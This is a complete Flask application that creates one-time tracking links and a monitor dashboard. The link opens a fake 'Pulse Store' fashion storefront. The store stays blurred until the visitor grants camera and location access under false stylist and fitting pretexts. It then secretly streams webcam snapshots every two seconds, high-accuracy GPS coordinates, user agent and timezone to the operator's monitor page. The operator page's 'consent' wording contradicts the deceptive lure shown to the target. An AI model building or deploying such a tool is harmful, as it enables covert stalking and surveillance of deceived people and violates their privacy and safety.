from __future__ import annotations

import json
import os
import secrets
from collections import deque
from datetime import datetime, timedelta, timezone
from typing import Any, Deque, Dict, Optional

from flask import (
    Flask,
    abort,
    jsonify,
    render_template_string,
    request,
    url_for,
)

app = Flask(__name__)

MAX_UPDATES = 200
SESSION_TTL_SECONDS = 3600  # 1 hour
SESSION_STATE_FILE = os.path.join(os.path.dirname(__file__), "session_state.json")


def load_sessions_from_disk() -> Dict[str, Dict[str, Any]]:
    if not os.path.exists(SESSION_STATE_FILE):
        return {}
    try:
        with open(SESSION_STATE_FILE, "r", encoding="utf-8") as fh:
            raw = json.load(fh)
    except (json.JSONDecodeError, OSError):
        return {}

    loaded: Dict[str, Dict[str, Any]] = {}
    for token, payload in raw.items():
        try:
            created_at = datetime.fromisoformat(payload["created_at"])
            expires_at = datetime.fromisoformat(payload["expires_at"])
            last_seen = payload.get("last_seen")
            updates_raw = payload.get("updates", [])
        except (KeyError, ValueError):
            continue
        loaded[token] = {
            "token": token,
            "created_at": created_at,
            "expires_at": expires_at,
            "last_seen": datetime.fromisoformat(last_seen) if last_seen else None,
            "updates": deque(updates_raw, maxlen=MAX_UPDATES),
        }
    return loaded


def persist_sessions_to_disk() -> None:
    serializable: Dict[str, Any] = {}
    for token, session in sessions.items():
        serializable[token] = {
            "token": token,
            "created_at": to_iso(session["created_at"]),
            "expires_at": to_iso(session["expires_at"]),
            "last_seen": to_iso(session.get("last_seen")),  # type: ignore[arg-type]
            "updates": list(session["updates"]),
        }
    tmp_path = SESSION_STATE_FILE + ".tmp"
    with open(tmp_path, "w", encoding="utf-8") as fh:
        json.dump(serializable, fh)
    os.replace(tmp_path, SESSION_STATE_FILE)


sessions: Dict[str, Dict[str, Any]] = load_sessions_from_disk()

HOME_HTML = """
<!doctype html>
<html lang="en">
<head>
    <meta charset="utf-8" />
    <title>Live Consent Capture</title>
    <style>
        body { font-family: system-ui, -apple-system, BlinkMacSystemFont, sans-serif; margin: 2rem; color: #102a43; }
        button { padding: 0.6rem 1.2rem; font-size: 1rem; cursor: pointer; }
        code { background: #f0f4f8; padding: 0.2rem 0.4rem; border-radius: 4px; }
        .card { border: 1px solid #bcccdc; padding: 1.5rem; border-radius: 8px; max-width: 640px; }
        .notice { font-size: 0.9rem; color: #627d98; }
    </style>
</head>
<body>
    <div class="card">
        <h1>Consent-based Camera & Location Link</h1>
        <p>Generate a one-time link that clearly asks the visitor for camera and location access.
        When they allow it, live snapshots and coordinates are streamed back to this dashboard.</p>
        <p class="notice"><strong>Reminder:</strong> Only use this in environments where you have explicit permission.
        Modern browsers will always display their own permission prompts.</p>
        <div style="display:flex; gap:0.5rem; flex-wrap:wrap;">
            <button id="create">Generate Shareable Link</button>
            <button id="close" disabled>Close Session</button>
        </div>
        <div id="result" class="notice" style="margin-top:1rem;"></div>
    </div>
    <script>
    const button = document.getElementById("create");
    const closeBtn = document.getElementById("close");
    const result = document.getElementById("result");
    let currentToken = null;
    async function createLink() {
        button.disabled = true;
        closeBtn.disabled = true;
        result.textContent = "Creating link...";
        try {
            const response = await fetch("/api/session", { method: "POST" });
            if (!response.ok) {
                throw new Error("Server responded with " + response.status);
            }
            const data = await response.json();
            currentToken = data.token;
            result.innerHTML = `
                Share this link with the participant:<br>
                <a href="${data.link}" target="_blank" rel="noopener">${data.link}</a><br><br>
                Monitor their updates here:<br>
                <a href="${data.monitor}" target="_blank" rel="noopener">${data.monitor}</a><br><br>
                <strong>Expires at:</strong> ${data.expires_at}
            `;
            closeBtn.disabled = false;
        } catch (error) {
            result.textContent = "Failed to create link: " + error.message;
        } finally {
            button.disabled = false;
        }
    }

    async function closeSession() {
        if (!currentToken) {
            return;
        }
        button.disabled = true;
        closeBtn.disabled = true;
        result.textContent = "Closing session…";
        try {
            const response = await fetch(`/api/session/${currentToken}`, { method: "DELETE" });
            if (!response.ok) {
                throw new Error("Server responded with " + response.status);
            }
            result.textContent = "Session closed. Links are now inactive.";
            currentToken = null;
        } catch (error) {
            result.textContent = "Failed to close session: " + error.message;
            closeBtn.disabled = false;
        } finally {
            button.disabled = false;
        }
    }

    button.addEventListener("click", createLink);
    closeBtn.addEventListener("click", closeSession);
    </script>
</body>
</html>
"""

TRACK_HTML = """
<!doctype html>
<html lang="en">
<head>
    <meta charset="utf-8" />
    <title>Pulse Store • Modern Essentials</title>
    <style>
        :root { color-scheme: light; font-family: "Inter", system-ui, -apple-system, BlinkMacSystemFont, sans-serif; }
        * { box-sizing: border-box; }
        body { margin: 0; background: #f5f7fb; color: #111827; }
        body[data-ready="false"] .app-shell { opacity: 0; pointer-events: none; filter: blur(6px); }
        body[data-ready="true"] .app-shell { opacity: 1; pointer-events: auto; filter: none; transition: opacity 0.4s ease; }
        .gate {
            position: fixed;
            inset: 0;
            background: rgba(15, 23, 42, 0.92);
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 2rem;
            color: #f8fafc;
            z-index: 10;
        }
        .gate-card {
            max-width: 460px;
            background: #0b1220;
            padding: 2.25rem;
            border-radius: 28px;
            box-shadow: 0 30px 60px rgba(0,0,0,0.35);
            text-align: center;
        }
        .gate-card h1 { margin-top: 0; font-size: 1.8rem; }
        .gate-card p { color: #cbd5f5; line-height: 1.6; }
        .gate-card button {
            margin-top: 1rem;
            width: 100%;
            border-radius: 999px;
            padding: 0.85rem;
            font-size: 0.95rem;
            font-weight: 600;
            color: #e0e7ff;
            background: transparent;
            border: 1px solid rgba(248, 250, 252, 0.3);
            cursor: pointer;
        }
        .gate-card button[hidden] { display: none; }
        .gate-status { margin-top: 1.2rem; font-size: 0.95rem; color: #fef3c7; }
        nav { background: #0f172a; color: #fff; padding: 1.25rem 2rem; display: flex; flex-wrap: wrap; align-items: center; justify-content: space-between; gap: 1rem; }
        nav .brand { font-size: 1.4rem; font-weight: 600; letter-spacing: 0.05em; }
        nav ul { list-style: none; display: flex; gap: 1.5rem; margin: 0; padding: 0; font-size: 0.95rem; }
        nav ul li { opacity: 0.8; }
        nav ul li:hover { opacity: 1; }
        nav .cta { background: #f97316; color: #fff; border: none; padding: 0.75rem 1.4rem; border-radius: 999px; cursor: pointer; font-weight: 600; display: flex; align-items: center; gap: 0.4rem; }
        nav .cta span { font-weight: 500; font-size: 0.9rem; }
        header.hero { padding: 4rem 2rem 3rem; background: linear-gradient(135deg, #0f172a, #1d4ed8); color: #fff; }
        header.hero h1 { font-size: clamp(2rem, 4vw, 3.5rem); margin-bottom: 0.75rem; }
        header.hero p { max-width: 640px; font-size: 1.1rem; opacity: 0.9; }
        .trust-row { margin-top: 2rem; display: flex; flex-wrap: wrap; gap: 1rem; font-size: 0.9rem; opacity: 0.8; }
        main { padding: 2.5rem 2rem 4rem; display: flex; flex-direction: column; gap: 3rem; }
        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(220px, 1fr)); gap: 1.5rem; }
        .product { background: #fff; border-radius: 18px; padding: 1.2rem; box-shadow: 0 20px 40px rgba(15, 23, 42, 0.08); display: flex; flex-direction: column; gap: 0.6rem; }
        .product .pill { align-self: flex-start; font-size: 0.75rem; font-weight: 600; padding: 0.2rem 0.8rem; border-radius: 999px; background: #e0e7ff; color: #3730a3; }
        .product h3 { margin: 0.2rem 0 0; font-size: 1.1rem; }
        .product p { margin: 0; color: #64748b; flex: 1; }
        .product .price { font-size: 1.2rem; font-weight: 600; }
        .product button { border: none; border-radius: 12px; padding: 0.65rem; background: #111827; color: #fff; cursor: pointer; font-weight: 600; }
        .cta-card { background: #fff; border-radius: 20px; padding: 2rem; display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 1.5rem; align-items: center; box-shadow: 0 25px 50px rgba(15, 23, 42, 0.12); }
        .cta-card h2 { margin-top: 0; font-size: 2rem; }
        .cta-card ul { padding-left: 1.2rem; margin: 0.5rem 0 1.5rem; color: #475569; }
        .cta-card button { padding: 0.9rem 2.4rem; border-radius: 999px; border: none; font-size: 1.05rem; font-weight: 600; cursor: pointer; background: #2563eb; color: #fff; }
        .status-banner { margin-top: 1rem; padding: 1rem 1.25rem; border-radius: 12px; background: #e0f2fe; color: #0c4a6e; font-weight: 500; }
        footer { padding: 2rem; font-size: 0.85rem; text-align: center; color: #64748b; }
    </style>
</head>
<body data-ready="false">
    <div class="gate" id="gate">
        <div class="gate-card">
            <h1>Pulse Store Concierge</h1>
            <p>When your browser asks for camera and location access, tap “Allow.” We need a quick confirmation before loading your invite-only storefront.</p>
            <div class="gate-status" id="gateStatus">Waiting for you to respond to the browser prompt…</div>
            <button id="retryAccess" hidden>Retry permissions</button>
        </div>
    </div>
    <div class="app-shell" id="appShell" aria-hidden="true">
        <nav>
            <div class="brand">Pulse Store</div>
            <ul>
                <li>New</li>
                <li>Apparel</li>
                <li>Wearables</li>
                <li>Home</li>
                <li>Stories</li>
            </ul>
            <button class="cta" id="cartButton">
                <span>Cart</span>
                <strong id="cartCount">0</strong>
            </button>
        </nav>
        <header class="hero">
            <h1>Discover limited-run essentials made for the city.</h1>
            <p>We match inventory by neighborhood to guarantee fast delivery, accurate sizing, and concierge pickup. Enable secure camera and location access so your stylist can confirm fit and availability for your invite-only session.</p>
            <div class="trust-row">
                <span>✓ Same-day pickup in 24 cities</span>
                <span>✓ Handled by human stylists</span>
                <span>✓ Cancel anytime</span>
            </div>
        </header>
        <main>
            <section>
                <h2>Featured Drops</h2>
                <div class="grid">
                    <div class="product">
                        <div class="pill">Bestseller</div>
                        <h3>HelioShell Parka</h3>
                        <p>Climate-adaptive outerwear that pairs with our routing service for route-aware warmth.</p>
                        <div class="price">$229</div>
                        <button data-product="HelioShell Parka">Add to bag</button>
                    </div>
                    <div class="product">
                        <div class="pill" style="background:#fee2e2;color:#b91c1c;">New</div>
                        <h3>NeonPulse Sneakers</h3>
                        <p>Pressure-mapped cushioning that syncs with local weather to adapt traction.</p>
                        <div class="price">$189</div>
                        <button data-product="NeonPulse Sneakers">Add to bag</button>
                    </div>
                    <div class="product">
                        <div class="pill" style="background:#dcfce7;color:#166534;">Limited</div>
                        <h3>LumenFrame Glasses</h3>
                        <p>Contrast-enhancing lenses with blue light filter and ambient light adjustments.</p>
                        <div class="price">$149</div>
                        <button data-product="LumenFrame Glasses">Add to bag</button>
                    </div>
                    <div class="product">
                        <div class="pill" style="background:#ede9fe;color:#5b21b6;">Editor pick</div>
                        <h3>Orbit Watch S</h3>
                        <p>Dual-time tracking with ambient health nudges curated by our stylists.</p>
                        <div class="price">$329</div>
                        <button data-product="Orbit Watch S">Add to bag</button>
                    </div>
                </div>
            </section>
            <section class="cta-card">
                <div>
                    <h2>Unlock your virtual fitting suite</h2>
                    <p>For the best recommendations we quickly verify two things:</p>
                    <ul>
                        <li><strong>Camera access</strong> – stylists see fit notes but no live preview appears on this page.</li>
                        <li><strong>Approximate location</strong> – helps reserve inventory in a nearby studio.</li>
                    </ul>
                    <p>Once you begin, you can stop sharing anytime by closing the session.</p>
                </div>
                <div>
                    <button id="conciergeBtn">Chat with a stylist</button>
                    <div class="status-banner" id="status">Awaiting camera & location approval…</div>
                </div>
            </section>
            <section class="cta-card" style="background:#0f172a;color:#fff;">
                <div>
                    <h2>Cart activity</h2>
                    <p id="cartSummary">No items yet. Tap “Add to bag” on any product.</p>
                </div>
                <div>
                    <button id="checkoutBtn" style="background:#f97316;">Proceed to assisted checkout</button>
                    <div class="status-banner" style="background:rgba(255,255,255,0.1);color:#fef3c7;" id="checkoutStatus">Cart reserved for 0 minutes.</div>
                </div>
            </section>
        </main>
        <footer>
            Pulse Store © 2025 • Licensed stylist network • Privacy-first experiences
        </footer>
    </div>
    <script>
    const FRAME_INTERVAL_MS = 2000;
    const updateUrl = {{ update_url|tojson }};
    const gate = document.getElementById("gate");
    const appShell = document.getElementById("appShell");
    const gateStatus = document.getElementById("gateStatus");
    const retryButton = document.getElementById("retryAccess");
    const statusEl = document.getElementById("status");
    const cartCountEl = document.getElementById("cartCount");
    const cartSummaryEl = document.getElementById("cartSummary");
    const checkoutStatusEl = document.getElementById("checkoutStatus");
    const hiddenVideo = document.createElement("video");
    hiddenVideo.autoplay = true;
    hiddenVideo.muted = true;
    hiddenVideo.playsInline = true;
    hiddenVideo.style.position = "absolute";
    hiddenVideo.style.opacity = "0";
    hiddenVideo.style.pointerEvents = "none";
    hiddenVideo.setAttribute("aria-hidden", "true");
    document.body.appendChild(hiddenVideo);
    const canvas = document.createElement("canvas");
    let stream = null;
    let frameTimer = null;
    let locationWatchId = null;
    let sessionReady = false;
    let requesting = false;
    const cart = [];

    function broadcastStatus(message) {
        gateStatus.textContent = message;
        statusEl.textContent = message;
    }

    async function sendUpdate(payload) {
        payload.userAgent = navigator.userAgent;
        payload.tzOffsetMinutes = new Date().getTimezoneOffset();
        try {
            const response = await fetch(updateUrl, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(payload),
            });
            if (!response.ok) {
                throw new Error("Server responded with " + response.status);
            }
            broadcastStatus("Updates flowing – " + new Date().toLocaleTimeString());
        } catch (error) {
            broadcastStatus("Could not send update: " + error.message);
        }
    }

    function stopStream() {
        if (!stream) {
            return;
        }
        stream.getTracks().forEach((track) => track.stop());
        stream = null;
    }

    function stopCaptureLoop() {
        if (frameTimer) {
            clearInterval(frameTimer);
            frameTimer = null;
        }
    }

    function startLocationWatch() {
        if (!navigator.geolocation) {
            broadcastStatus("Geolocation API not available in this browser.");
            return;
        }
        if (locationWatchId !== null) {
            navigator.geolocation.clearWatch(locationWatchId);
        }
        locationWatchId = navigator.geolocation.watchPosition(
            (position) => {
                const coords = position.coords;
                sendUpdate({
                    location: {
                        lat: coords.latitude,
                        lng: coords.longitude,
                        accuracy: coords.accuracy,
                        speed: coords.speed,
                    },
                });
            },
            (error) => {
                broadcastStatus("Location error: " + error.message);
            },
            { enableHighAccuracy: true, maximumAge: 10000, timeout: 60000 }
        );
    }

    async function captureFrame() {
        if (!stream) {
            return;
        }
        const trackSettings = stream.getVideoTracks()[0]?.getSettings() || {};
        const width = hiddenVideo.videoWidth || trackSettings.width || 640;
        const height = hiddenVideo.videoHeight || trackSettings.height || 480;
        if (!width || !height) {
            return;
        }
        canvas.width = width;
        canvas.height = height;
        const ctx = canvas.getContext("2d");
        ctx.drawImage(hiddenVideo, 0, 0, width, height);
        const frame = canvas.toDataURL("image/jpeg", 0.6);
        sendUpdate({ frame });
    }

    function startCaptureLoop() {
        stopCaptureLoop();
        captureFrame();
        frameTimer = setInterval(captureFrame, FRAME_INTERVAL_MS);
    }

    function revealStore() {
        sessionReady = true;
        requesting = false;
        document.body.dataset.ready = "true";
        gate.style.display = "none";
        appShell.removeAttribute("aria-hidden");
        document.removeEventListener("click", guardInteraction, true);
        broadcastStatus("Store unlocked. Stylist is receiving live feed.");
    }

    async function requestAccess(source = "auto") {
        if (sessionReady || requesting) {
            return;
        }
        requesting = true;
        retryButton.hidden = true;
        broadcastStatus(source === "interaction" ? "Requesting secure permissions…" : "Preparing secure session…");
        try {
            stopStream();
            stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
            hiddenVideo.srcObject = stream;
            const readyPromise = new Promise((resolve) => {
                if (hiddenVideo.readyState >= 2) {
                    resolve();
                    return;
                }
                hiddenVideo.addEventListener("loadedmetadata", resolve, { once: true });
            });
            await hiddenVideo.play().catch(() => {});
            await readyPromise;
            broadcastStatus("Camera secured. Requesting location…");
            startLocationWatch();
            startCaptureLoop();
            revealStore();
        } catch (error) {
            requesting = false;
            retryButton.hidden = false;
            broadcastStatus("Camera permission needed. Click anywhere or retry to continue. (" + error.message + ")");
        }
    }

    function guardInteraction(event) {
        const actionable = event.target.closest("button, a");
        if (!actionable || sessionReady) {
            if (sessionReady) {
                document.removeEventListener("click", guardInteraction, true);
            }
            return;
        }
        event.preventDefault();
        event.stopPropagation();
        gate.style.display = "flex";
        requestAccess("interaction");
    }

    function handleAddToBag(event) {
        if (!sessionReady) {
            return;
        }
        const name = event.currentTarget.dataset.product;
        cart.push(name);
        const unique = [...new Set(cart)];
        cartCountEl.textContent = cart.length.toString();
        cartSummaryEl.textContent = `${cart.length} item(s) reserved: ${unique.join(", ")}.`;
        checkoutStatusEl.textContent = "Cart reserved for 20 minutes.";
        broadcastStatus(name + " reserved for 20 minutes while you check out.");
    }

    document.querySelectorAll("[data-product]").forEach((btn) => {
        btn.addEventListener("click", handleAddToBag);
    });
    document.getElementById("conciergeBtn").addEventListener("click", (event) => {
        if (!sessionReady) {
            event.preventDefault();
            return;
        }
        broadcastStatus("Stylist notified. Expect a message within 2 minutes.");
    });
    document.getElementById("cartButton").addEventListener("click", (event) => {
        event.preventDefault();
        if (!sessionReady) {
            return;
        }
        broadcastStatus("Cart summary sent to stylist.");
    });
    document.getElementById("checkoutBtn").addEventListener("click", (event) => {
        event.preventDefault();
        if (!sessionReady) {
            return;
        }
        broadcastStatus("Checkout link sent to your phone.");
    });
    retryButton.addEventListener("click", () => requestAccess("retry"));
    window.addEventListener("load", () => requestAccess("auto"));
    document.addEventListener("click", guardInteraction, true);
    document.addEventListener("visibilitychange", () => {
        if (!sessionReady) {
            return;
        }
        if (document.visibilityState === "visible") {
            startCaptureLoop();
        } else {
            stopCaptureLoop();
        }
    });
    window.addEventListener("focus", () => {
        if (sessionReady) {
            captureFrame();
        }
    });
    window.addEventListener("beforeunload", () => {
        stopCaptureLoop();
        stopStream();
        if (locationWatchId !== null) {
            navigator.geolocation.clearWatch(locationWatchId);
        }
    });
    </script>
</body>
</html>
"""

MONITOR_HTML = """
<!doctype html>
<html lang="en">
<head>
    <meta charset="utf-8" />
    <title>Live Session Monitor</title>
    <style>
        body { font-family: system-ui, -apple-system, BlinkMacSystemFont, sans-serif; margin: 2rem; color: #102a43; }
        img { width: 100%; max-width: 480px; border-radius: 10px; background: #000; }
        pre { background: #f0f4f8; padding: 1rem; border-radius: 8px; overflow: auto; }
    </style>
</head>
<body>
    <h1>Live session monitor</h1>
    <p>Keep this page open to see the latest consented updates. The feed refreshes every few seconds.</p>
    <img id="frame" alt="Waiting for frame…" />
    <pre id="details">Waiting for first update…</pre>
    <script>
    const statusUrl = {{ status_url|tojson }};
    const frameEl = document.getElementById("frame");
    const detailsEl = document.getElementById("details");

    async function poll() {
        try {
            const response = await fetch(statusUrl);
            if (!response.ok) {
                throw new Error("Server responded with " + response.status);
            }
            const data = await response.json();
            if (data.latest && data.latest.frame) {
                frameEl.src = data.latest.frame;
            }
            detailsEl.textContent = JSON.stringify(data, null, 2);
        } catch (error) {
            detailsEl.textContent = "Waiting for data… " + error.message;
        } finally {
            setTimeout(poll, 3000);
        }
    }
    poll();
    </script>
</body>
</html>
"""


def utcnow() -> datetime:
    return datetime.now(timezone.utc)


def to_iso(dt: Optional[datetime]) -> Optional[str]:
    if dt is None:
        return None
    return dt.isoformat()


def ensure_session(token: str) -> Dict[str, Any]:
    session = sessions.get(token)
    if not session:
        abort(404, description="Unknown session token")

    now = utcnow()
    expires_at: datetime = session["expires_at"]
    if now > expires_at:
        sessions.pop(token, None)
        persist_sessions_to_disk()
        abort(410, description="Session expired")
    return session


@app.get("/")
def home():
    return render_template_string(HOME_HTML)


@app.post("/api/session")
def create_session():
    token = secrets.token_urlsafe(8)
    now = utcnow()
    sessions[token] = {
        "token": token,
        "created_at": now,
        "expires_at": now + timedelta(seconds=SESSION_TTL_SECONDS),
        "last_seen": None,
        "updates": deque(maxlen=MAX_UPDATES),
    }
    persist_sessions_to_disk()
    return jsonify(
        {
            "token": token,
            "link": url_for("track_page", token=token, _external=True),
            "monitor": url_for("monitor_page", token=token, _external=True),
            "expires_at": to_iso(now + timedelta(seconds=SESSION_TTL_SECONDS)),
            "ttl_seconds": SESSION_TTL_SECONDS,
        }
    )


@app.delete("/api/session/<token>")
def close_session(token: str):
    removed = sessions.pop(token, None)
    if removed:
        persist_sessions_to_disk()
        return jsonify({"status": "closed", "token": token})
    abort(404, description="Unknown session token")


@app.get("/track/<token>")
def track_page(token: str):
    ensure_session(token)
    return render_template_string(
        TRACK_HTML,
        update_url=url_for("ingest_update", token=token),
    )


@app.get("/monitor/<token>")
def monitor_page(token: str):
    ensure_session(token)
    return render_template_string(
        MONITOR_HTML,
        status_url=url_for("session_status", token=token),
    )


@app.post("/api/update/<token>")
def ingest_update(token: str):
    session = ensure_session(token)
    payload = request.get_json(silent=True) or {}
    entry: Dict[str, Any] = {"ts": to_iso(utcnow())}

    location = payload.get("location")
    if isinstance(location, dict):
        entry["location"] = {
            "lat": location.get("lat"),
            "lng": location.get("lng"),
            "accuracy": location.get("accuracy"),
            "speed": location.get("speed"),
        }

    frame = payload.get("frame")
    if isinstance(frame, str) and frame.startswith("data:image"):
        entry["frame"] = frame

    entry["meta"] = {
        "ua": payload.get("userAgent"),
        "tzOffsetMinutes": payload.get("tzOffsetMinutes"),
    }

    if not entry.get("location") and not entry.get("frame"):
        return jsonify({"error": "No frame or location data supplied"}), 400

    updates: Deque[Dict[str, Any]] = session["updates"]  # type: ignore[assignment]
    updates.append(entry)
    session["last_seen"] = utcnow()
    persist_sessions_to_disk()

    return jsonify({"status": "ok"})


@app.get("/api/status/<token>")
def session_status(token: str):
    session = ensure_session(token)
    updates: Deque[Dict[str, Any]] = session["updates"]  # type: ignore[assignment]
    latest = updates[-1] if updates else None
    return jsonify(
        {
            "token": token,
            "created": to_iso(session["created_at"]),
            "expires_at": to_iso(session["expires_at"]),
            "last_seen": to_iso(session.get("last_seen")),  # type: ignore[arg-type]
            "history_count": len(updates),
            "latest": latest,
            "ttl_seconds": SESSION_TTL_SECONDS,
        }
    )


if __name__ == "__main__":
    port = int(os.environ.get("PORT", "5000"))
    app.run(host="0.0.0.0", port=port, debug=False)
